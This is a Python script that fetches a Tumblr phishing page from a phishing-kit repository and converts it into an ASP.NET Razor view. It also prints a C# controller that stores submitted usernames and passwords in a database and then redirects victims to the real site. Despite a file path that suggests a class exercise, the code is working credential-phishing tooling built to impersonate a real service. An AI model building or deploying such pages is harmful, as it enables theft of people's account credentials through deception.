import re, requests
from bs4 import BeautifulSoup

website_name = "tumblr"
link = "https://raw.githubusercontent.com/graysuit/grayfish/master/Gray%20fish/sites/tumblr.php"

def make_css_file(styles):
    with open(f"/home/zain/Documents/Class/class3/wwwroot/css/{website_name}.css", "a") as fp:
        for style in styles:
            fp.write(style.text + "\n")

extra_import = "<link rel=stylesheet type=text/css href=\"~/css/000webhost.css\">"
styles_import = f"<link rel=stylesheet type=text/css href=\"~/css/{website_name}.css\">"

page = requests.get(link).text
soup = BeautifulSoup(page, "html.parser")
head = soup.find("head")
head = re.sub('<style>(.*)</style>', "", str(head))

body = soup.find("body")
body = re.sub('<style>(.*)</style>', "", str(body))

styles = soup.find_all("style")

make_css_file(styles)

body = body.replace("<form action=\".././other/post_in_file.php\" method=\"post\">", "@using (Html.BeginForm()){")
body = body.replace("<form action=\".././other/post_in_file.php\" method=\"POST\">", "@using (Html.BeginForm()){")
body = body.replace("</form>", "}")

head = head.replace("</title>", "</title>\n" + extra_import + "\n" + styles_import + "\n")

with open(f"/home/zain/Documents/Class/class3/Views/Home/{website_name}.cshtml", "wt") as fp:
    fp.write(head + "\n" + body)










code  = """
        public IActionResult {}()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult {}(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "{}";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.{}.com", permanent: true
                             );
        }
""".replace("{}", website_name)

print(code)